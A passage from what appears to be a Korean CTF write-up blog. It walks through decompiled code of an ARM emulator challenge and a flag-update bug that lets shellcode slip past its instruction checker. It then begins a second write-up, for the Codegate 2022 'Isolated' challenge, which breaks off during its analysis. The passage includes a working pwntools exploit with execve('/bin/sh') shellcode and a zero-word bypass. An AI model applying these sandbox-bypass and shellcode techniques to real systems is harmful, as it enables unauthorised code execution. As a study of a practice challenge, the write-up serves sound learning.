<p><code>edit_code</code> 함수는 <code>em-&gt;code</code> 주소에 실행할 코드를 입력받는데, 길이가 4의 배수가 아니면 -1을 반환합니다. 이 경우 <code>main</code> 함수에서 <code>exit(-1)</code> 을 호출하여 종료합니다. 입력받은 후 <code>exit</code> 시스템 콜을 호출하는 코드를 뒤에 덧붙입니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">edit_code</span><span class="params">()</span> <span class="comment">// 0x10af0</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> len; <span class="comment">// [sp+4h] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  len = read(<span class="number">0</span>, em-&gt;code, <span class="number">4031u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( len &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (len &amp; <span class="number">3</span>) != <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;em-&gt;code[len], &amp;exit_code, <span class="number">12u</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>check_code</code> 함수는 반복문을 돌면서 <code>em-&gt;reg-&gt;pc</code> 로부터 4바이트씩 인스트럭션 <code>inst</code> 를 읽습니다. <code>check_cpsr</code> 함수를 <code>inst</code> 를 인자로 호출하여 리턴값이 0이 아니면, switch-case 구문으로 인스트럭션의 클래스에 해당하는 <code>check_*</code> 함수를 호출합니다. <code>check_cpsr</code> 함수가 0을 리턴하거나 <code>check_*</code> 함수가 -1을 리턴하는 경우 <code>sigill</code> 함수를 호출하는데, 이 함수는 오류 메시지를 출력하고 <code>exit(-1)</code> 로 프로그램을 종료합니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">check_code</span><span class="params">()</span> <span class="comment">// 0x10bb0</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> op1; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> inst; <span class="comment">// [sp+0h] [bp-Ch]</span></span><br><span class="line">  <span class="type">int</span> fetched; <span class="comment">// [sp+4h] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( inst = <span class="number">-1</span>; em-&gt;reg-&gt;pc &lt; (<span class="type">unsigned</span> <span class="type">int</span>)(em-&gt;code + <span class="number">4096</span>); inst = fetched )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">char</span> *)em-&gt;reg-&gt;pc &lt; em-&gt;code )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    fetched = *(_DWORD *)em-&gt;reg-&gt;pc;</span><br><span class="line">    em-&gt;reg-&gt;pc += <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !inst )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( inst != <span class="number">-1</span> &amp;&amp; !check_cpsr(inst) )</span><br><span class="line">      sigill(inst);</span><br><span class="line">    op1 = get_class(inst);</span><br><span class="line">    <span class="keyword">if</span> ( op1 &lt;= <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> ( op1 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0u</span>:                                <span class="comment">// data processing and miscellaneous instructions</span></span><br><span class="line">          <span class="keyword">if</span> ( check_data_processing(inst) == <span class="number">-1</span> )</span><br><span class="line">            sigill(inst);</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">          <span class="keyword">if</span> ( check_multiply(inst) == <span class="number">-1</span> )</span><br><span class="line">            sigill(inst);</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2u</span>:                                <span class="comment">// branch, branch with link, block data transfer</span></span><br><span class="line">          <span class="keyword">if</span> ( check_branch(inst) == <span class="number">-1</span> )</span><br><span class="line">            sigill(inst);</span><br><span class="line">          fetched = <span class="number">-1</span>;</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3u</span>:                                <span class="comment">// supervisor call</span></span><br><span class="line">          <span class="keyword">if</span> ( check_syscall() == <span class="number">-1</span> )</span><br><span class="line">            sigill(inst);</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4u</span>:                                <span class="comment">// load/store word and unsigned byte</span></span><br><span class="line">          <span class="keyword">if</span> ( check_load_store(inst) == <span class="number">-1</span> )</span><br><span class="line">            sigill(inst);</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          <span class="keyword">goto</span> LABEL_23;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( op1 != <span class="number">-1</span> )</span><br><span class="line">LABEL_23:</span><br><span class="line">      sigill(inst);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>각각의 <code>check_*</code> 함수는 인스트럭션의 형식이나 인자를 검사한 후, 통과하면 인스트럭션의 실행 결과를 <code>emulator</code> 구조체 변수 <code>em</code> 에 반영하고 통과하지 못한 경우 -1을 리턴하여 종료하도록 합니다. 예를 들어 <code>check_branch</code> 함수는 인자가 상수(immediate) 값인 분기 인스트럭션을 검사하고 <code>em-&gt;reg-&gt;pc</code> 를 갱신하는데, 조건문을 통해 목적지 주소가 <code>em-&gt;code</code> 로 할당된 메모리를 벗어나는 경우 -1을 반환합니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">check_branch</span><span class="params">(<span class="type">int</span> inst)</span>   <span class="comment">// 0x11f28</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// r3</span></span><br><span class="line"></span><br><span class="line">  v1 = shl8(inst);</span><br><span class="line">  v2 = <span class="number">4</span> * (v1 &gt;&gt; <span class="number">8</span>);</span><br><span class="line">  <span class="keyword">if</span> ( ((v1 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0x20000000</span>) != <span class="number">0</span> )</span><br><span class="line">    v2 += <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( em-&gt;reg-&gt;pc + <span class="number">4</span> * (v2 &gt;&gt; <span class="number">2</span>) &gt;= (<span class="type">unsigned</span> <span class="type">int</span>)(em-&gt;code + <span class="number">0x4000</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  em-&gt;reg-&gt;pc += <span class="number">4</span> * (<span class="number">4</span> * (v1 &gt;&gt; <span class="number">8</span>) / <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="%EB%AC%B8%EC%A0%9C-%ED%92%80%EC%9D%B4" tabindex="-1">문제 풀이</h2>
<p>분석한 결과를 바탕으로 생각할 수 있는 익스플로잇 시나리오가 두 가지 정도 있습니다.</p>
<ol>
<li><code>check_code</code> 함수의 <code>check_*</code> 루틴에서 익스플로잇 프리미티브(e.g. 임의 쓰기)를 찾아 익스플로잇한다.</li>
<li><code>check_code</code> 의 검사를 통과하면서, <code>main</code> 에서 입력한 코드를 호출했을 때 익스플로잇이 수행되는 셸코드를 입력한다.</li>
</ol>
<p>그런데 <code>check_*</code> 함수들은 대부분 목적지 레지스터나 주소의 범위에 제한을 두고 있어 익스플로잇 프리미티브 구성에 도움이 되지 않습니다. 예를 들어 다음은 <code>check_load_store</code> 함수의 일부입니다. 23행, 26행, 32행 등을 보면 목적지 레지스터는 <code>R0</code> , … , <code>R12</code> 까지만 가능하도록, 읽고 쓰는 주소는 <code>em-&gt;heap</code> , <code>em-&gt;stack</code> 으로 할당된 메모리만 가능하도록 제한을 두고 있습니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">check_load_store</span><span class="params">(<span class="type">int</span> inst)</span>	<span class="comment">// 0x12000</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  bit11_0 = get_bit11_0(inst);</span><br><span class="line">  rn = get_bit16_19(inst);</span><br><span class="line">  <span class="keyword">if</span> ( rn &lt;= <span class="number">12</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    rn_val = (<span class="type">char</span> *)*(&amp;em-&gt;reg-&gt;r0 + rn);</span><br><span class="line">    <span class="keyword">if</span> ( get_bit25(inst) )                      <span class="comment">// bit25 is 1 (A bit)</span></span><br><span class="line">    &#123;</span><br><span class="line">      rm = bit11_0 &amp; <span class="number">0xF</span>;</span><br><span class="line">      <span class="keyword">if</span> ( rm &gt; <span class="number">12</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">if</span> ( get_bit24(inst) )                      <span class="comment">// bit24 is 1 (P bit)</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( get_bit23(inst) )                    <span class="comment">// bit23 is 1 (U bit)</span></span><br><span class="line">        v6 = &amp;rn_val[bit11_0];</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v6 = &amp;rn_val[-bit11_0];</span><br><span class="line">      <span class="keyword">if</span> ( get_bit20(inst) )                    <span class="comment">// bit20 is 1</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (v6 &lt; em-&gt;heap || v6 &gt; em-&gt;heap + <span class="number">4096</span>) &amp;&amp; (v6 &lt; em-&gt;<span class="built_in">stack</span> || v6 &gt; em-&gt;<span class="built_in">stack</span> + <span class="number">4096</span>) )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        rt = shr12(inst);</span><br><span class="line">        <span class="keyword">if</span> ( rt &gt; <span class="number">0xC</span> )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        *(&amp;em-&gt;reg-&gt;r0 + rt) = *(_DWORD *)v6;   <span class="comment">// load</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (v6 &lt; em-&gt;heap || v6 &gt; em-&gt;heap + <span class="number">4096</span>) &amp;&amp; (v6 &lt; em-&gt;<span class="built_in">stack</span> || v6 &gt; em-&gt;<span class="built_in">stack</span> + <span class="number">4096</span>) )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        v13 = shr12(inst);</span><br><span class="line">        <span class="keyword">if</span> ( v13 &gt; <span class="number">0xC</span> )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        *(_DWORD *)v6 = *(&amp;em-&gt;reg-&gt;r0 + v13);  <span class="comment">// store</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
<p>산술 연산과 관련된 인스트럭션을 검사하는 <code>check_data_processing</code> 함수에서도 9행, 11행 등에서 산술 연산의 목적지와 인자 레지스터에 제한을 두고 있습니다. 그런데 실제 연산의 결과를 반영하는 서브루틴에서 흥미로운 코드를 찾을 수 있습니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">check_data_processing</span><span class="params">(<span class="type">int</span> inst)</span>	<span class="comment">// 0x117b8</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  v7 = sub_114E0(inst);</span><br><span class="line">  bit11_0 = get_bit11_0(inst);</span><br><span class="line">  bit16_19 = get_bit16_19(inst);</span><br><span class="line">  v10 = shr12(inst);</span><br><span class="line">  bit20 = get_bit20(inst);</span><br><span class="line">  <span class="keyword">if</span> ( bit16_19 &lt; <span class="number">0</span> || bit16_19 &gt; <span class="number">12</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v10 &lt; <span class="number">0</span> || v10 &gt; <span class="number">12</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">switch</span> ( v7 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">      <span class="keyword">if</span> ( check_add(bit16_19, v4, v10, bit20) == <span class="number">-1</span> )</span><br><span class="line">        sigill(inst);</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    <span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
<p><code>check_add</code> 함수는 <code>check_data_processing</code> 함수에서 <code>ADD</code> 인스트럭션의 결과를 반영하기 위해 호출하는 서브루틴입니다. 이 함수는 연산 결과를 목적지 레지스터에 대입하고, <code>update_zf_nf</code> 함수를 호출하여 <code>CPSR</code> 레지스터의 플래그를 갱신하고 있습니다. (<code>update_zf_nf</code> 함수를 호출하는 조건 <code>a4</code> 는 인스트럭션의 bit 20이 전달된 값으로, <code>S</code> 비트에 해당합니다)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">check_add</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3, <span class="type">int</span> a4)</span>	<span class="comment">// 0x12fb8</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// [sp+14h] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  update_cf(*(&amp;em-&gt;reg-&gt;r0 + a1) + a2 &lt; *(&amp;em-&gt;reg-&gt;r0 + a1));</span><br><span class="line">  result = a2 + *(&amp;em-&gt;reg-&gt;r0 + a1);</span><br><span class="line">  <span class="keyword">if</span> ( a4 )</span><br><span class="line">    update_zf_nf(result);</span><br><span class="line">  *(&amp;em-&gt;reg-&gt;r0 + a3) = result;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>update_zf_nf</code> 함수는 인자로 받은 연산 결과를 <code>update_zf</code> , <code>update_nf</code> 함수에 전달합니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">update_zf_nf</span><span class="params">(<span class="type">int</span> a1)</span>	<span class="comment">// 0x12d4c</span></span><br><span class="line">&#123;</span><br><span class="line">  update_zf(a1);</span><br><span class="line">  update_nf(a1);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>update_nf</code> 함수는 연산의 결과가 0이 아닐 경우 비트 연산을 통해 <code>em-&gt;reg-&gt;cpsr</code> 값의 bit 31에 1을 대입합니다. 이는 <code>CPSR</code> 레지스터의 <code>N</code> 비트에 해당하는데, 정의 상 <code>N</code> 비트는 결과가 음수인 경우(최상위 비트가 1인 경우) 1이어야 합니다. 따라서 <code>update_nf</code> 함수는 <code>em-&gt;reg-&gt;cpsr</code> 값을 실제 인스트럭션의 결과와 다르게 반영하고 있습니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">update_nf</span><span class="params">(<span class="type">int</span> a1)</span>    <span class="comment">// 0x12ccc</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">    em-&gt;reg-&gt;cpsr |= <span class="number">0x80000000</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    em-&gt;reg-&gt;cpsr &amp;= <span class="number">0x70000000</span>u;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>이를 이용해 다음과 같이 셀코드를 입력하고도 <code>check_code</code> 함수를 통과하여 실행하는 익스플로잇 시나리오를 구성할 수 있습니다. (단순 셸코드를 입력하면 <code>check_syscall</code> 함수에서 시스템 콜 번호를 필터링하여 종료합니다)</p>
<ol>
<li>산술 연산을 통해 <code>em-&gt;reg-&gt;cpsr</code> 의 <code>N</code> 비트가 1이 되도록 합니다. (잘못 반영된 결과입니다)</li>
<li><code>N</code> 비트와 관련된 조건 분기를 통해 셸코드 부분을 실행하지 않고 점프하도록 합니다.</li>
<li>실제 실행 시에는 <code>N</code> 비트가 0으로 조건 분기를 수행하지 않아, 셸코드를 실행하게 됩니다.</li>
</ol>
<p><code>check_cpsr</code> 함수를 보면 모든 조건이 구현되어 있지는 않지만, <code>LT</code> (signed less than) 조건은 구현되어 있습니다. 따라서 셸코드 이전에 결과가 0이 아닌 산술 연산을 수행하고 <code>BLT</code> 인스트럭션으로 조건 분기하도록 하겠습니다. <code>check_code</code> 함수 상에서는 <code>update_nf</code> 함수에서 잘못 반영한 결과로 인해 <code>N</code> 비트가 1이 되어, <code>V</code> 비트와 같지 않게 되므로 조건 분기를 수행합니다. 그러나 실제 실행 시에는 <code>N</code> 비트가 0으로 조건 분기를 수행하지 않을 것입니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">check_cpsr</span><span class="params">(<span class="type">int</span> inst)</span> <span class="comment">// 0x11314</span></span><br><span class="line">&#123;</span><br><span class="line">  _BOOL4 v1; <span class="comment">// r3</span></span><br><span class="line">  _BOOL4 v2; <span class="comment">// r3</span></span><br><span class="line">  <span class="type">int</span> valid; <span class="comment">// [sp+8h] [bp-24h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> cpsr; <span class="comment">// [sp+10h] [bp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  cpsr = em-&gt;reg-&gt;cpsr;</span><br><span class="line">  <span class="keyword">switch</span> ( shr28(inst) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0u</span>:                                    <span class="comment">// equal (z == 1)</span></span><br><span class="line">      valid = cpsr &amp; <span class="number">0x40000000</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1u</span>:                                    <span class="comment">// not equal (z == 0)</span></span><br><span class="line">      valid = (cpsr &amp; <span class="number">0x40000000</span>) == <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">10u</span>:                                   <span class="comment">// signed greater than or equal (n == v)</span></span><br><span class="line">      valid = cpsr &gt;&gt; <span class="number">31</span> == (<span class="number">8</span> * cpsr) &gt;&gt; <span class="number">31</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">11u</span>:                                   <span class="comment">// signed less than (n != v)</span></span><br><span class="line">      valid = cpsr &gt;&gt; <span class="number">31</span> != (<span class="number">8</span> * cpsr) &gt;&gt; <span class="number">31</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">12u</span>:                                   <span class="comment">// signed greater than (z == 0 and n == v)</span></span><br><span class="line">      v1 = (cpsr &amp; <span class="number">0x40000000</span>) == <span class="number">0</span> &amp;&amp; cpsr &gt;&gt; <span class="number">31</span> == (<span class="number">8</span> * cpsr) &gt;&gt; <span class="number">31</span>;</span><br><span class="line">      valid = v1;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">13u</span>:                                   <span class="comment">// signed less than or equal (z == 1 or n == v)</span></span><br><span class="line">      v2 = (cpsr &amp; <span class="number">0x40000000</span>) != <span class="number">0</span> || cpsr &gt;&gt; <span class="number">31</span> != (<span class="number">8</span> * cpsr) &gt;&gt; <span class="number">31</span>;</span><br><span class="line">      valid = v2;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">14u</span>:                                   <span class="comment">// always</span></span><br><span class="line">      valid = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:                                    <span class="comment">// can only be executed unconditionally</span></span><br><span class="line">      valid = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> valid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>다음과 같이 <code>ADDS</code> 인스트럭션의 결과가 1이 되도록 하고, <code>BLT</code> 의 분기 주소를 셸코드 이후가 되도록 익스플로잇 코드를 작성하였습니다. 익스플로잇 코드를 실행하면 셸을 획득할 수 있습니다.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># r = process([&quot;qemu-arm-static&quot;, &quot;-L&quot;, &quot;/usr/arm-linux-gnueabi&quot;, &quot;./app&quot;])</span></span><br><span class="line">r = remote(<span class="string">&quot;localhost&quot;</span>, <span class="number">1234</span>)</span><br><span class="line"><span class="comment"># context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    payload = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    adds r0, r0, 1</span></span><br><span class="line"><span class="string">    blt exit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">shellcode:</span></span><br><span class="line"><span class="string">    add r0, pc, 12</span></span><br><span class="line"><span class="string">    mov r1, 0</span></span><br><span class="line"><span class="string">    mov r2, 0</span></span><br><span class="line"><span class="string">    mov r7, 11</span></span><br><span class="line"><span class="string">    svc 0</span></span><br><span class="line"><span class="string">    .word 0x6e69622f</span></span><br><span class="line"><span class="string">    .word 0x0068732f</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">exit:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>, arch=<span class="string">&quot;arm&quot;</span>)</span><br><span class="line"></span><br><span class="line">    r.sendafter(<span class="string">b&quot;Insert Your Code :&gt;&quot;</span>, payload)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;:&gt;&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;Secret code :&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;Code? :&gt;&quot;</span>, r.recvline().strip())</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./ex.py</span><br><span class="line">[+] Opening connection to localhost on port 1234: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"> Good! Now Execute Real Machine</span><br><span class="line">$ <span class="built_in">id</span></span><br><span class="line">uid=1000(ctf) gid=1000(ctf) <span class="built_in">groups</span>=1000(ctf)</span><br></pre></td></tr></table></figure>
<h3 id="%EB%8B%A4%EB%A5%B8-%ED%92%80%EC%9D%B4" tabindex="-1">다른 풀이</h3>
<p><code>check_code</code> 함수를 보면 다음의 10행에서 <code>inst</code> 가 0인 경우 반복문을 탈출합니다. 이 경우 0을 리턴하여 <code>main</code> 함수의 검사를 통과하기 때문에 곧바로 입력한 코드를 실행할 수 있습니다. ARM에서 기계어 <code>\x00\x00\x00\x00</code> 은 <code>ANDEQ R0, R0, R0</code> 인스트럭션에 해당하는데, 실제로는 아무 영향이 없는 <code>NOP</code> 와 같습니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">check_code</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">for</span> ( inst = <span class="number">-1</span>; em-&gt;reg-&gt;pc &lt; (<span class="type">unsigned</span> <span class="type">int</span>)(em-&gt;code + <span class="number">4096</span>); inst = fetched )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">char</span> *)em-&gt;reg-&gt;pc &lt; em-&gt;code )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    fetched = *(_DWORD *)em-&gt;reg-&gt;pc;</span><br><span class="line">    em-&gt;reg-&gt;pc += <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !inst )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( inst != <span class="number">-1</span> &amp;&amp; !check_cpsr(inst) )</span><br><span class="line">      sigill(inst);</span><br><span class="line">    op1 = get_class(inst);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">if</span> ( op1 != <span class="number">-1</span> )</span><br><span class="line">LABEL_23:</span><br><span class="line">      sigill(inst);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>따라서 코드를 입력할 때 <code>\x00\x00\x00\x00</code> 이후 셸코드를 입력하면 <code>check_code</code> 함수를 통과하여 셸코드를 실행할 수 있습니다. 이 풀이는 출제자가 디스코드에서 의도하지 않은 풀이라고 밝혔습니다.</p>
<h2 id="%EC%B0%B8%EA%B3%A0%EC%9E%90%EB%A3%8C" tabindex="-1">참고자료</h2>
<p>[1] ARM, “A5: ARM Instruction Set Encoding,” in <em>ARM® Architecture Reference Manual ARMv7-A and ARMv7-R edition</em>. ARM Limited, 2018, pp. 191-216.</p>
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css">
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">
]]></content>
      <categories>
        <category>Security</category>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>[Codegate CTF 2022] Isolated</title>
    <url>/2022/07/06/codegate22-isolated/</url>
    <content><![CDATA[<h2 id="%EA%B0%9C%EC%9A%94" tabindex="-1">개요</h2>
<blockquote>
<p>Simple VM, But isloated.</p>
</blockquote>
<p><a href="/uploads/codegate22-isolated/chall.zip">chall.zip</a></p>
<h2 id="%EB%AC%B8%EC%A0%9C-%EB%B6%84%EC%84%9D" tabindex="-1">문제 분석</h2>
<p>64비트 x86_64 바이너리 <code>isolated</code> 와 <code>Dockerfile</code> 등이 주어집니다. 바이너리는 심볼이 strip되어 있고, Canary, NX, PIE 보호 기법이 적용되어 있습니다.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ checksec isolated</span><br><span class="line">[*] <span class="string">&#x27;/home/user/study/ctf/codegate22/isolated/isolated&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>바이너리를 실행하면 로고를 출력하고 opcode를 입력받습니다. 아무 문자열이나 입력했더니 <code>SIGKILL</code> 시그널을 받고 종료합니다. 로고의 'VM’이나, opcode를 입력받는다는 점에서 가상머신을 묘사한 바이너리임을 추측할 수 있습니다.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./isolated</span><br><span class="line">   __   __        __       ___  ___  __</span><br><span class="line">| /__` /  \ |    /  \  /\   |  |__  |  \    __    \  /  |\/|</span><br><span class="line">| .__/ \__/ |___ \__/ /~~\  |  |___ |__/           \/   |  |</span><br><span class="line"></span><br><span class="line">opcodes &gt;aaaa</span><br><span class="line">[1]    1544809 killed     ./isolated</span><br></pre></td></tr></table></figure>
<p><code>main</code> 함수를 살펴보면 다음과 같습니다. 12행에서 <code>code</code> 를 768바이트 입력받고, 13행에서 <code>context</code> 구조체를 할당합니다. 14행에서 <code>fork</code> 시스템 콜을 호출하여 자식 프로세스는 <code>run</code> 함수를 호출하고, 부모 프로세스는 <code>set_signal_handlers</code> 프로세스를 호출하도록 합니다.</p>
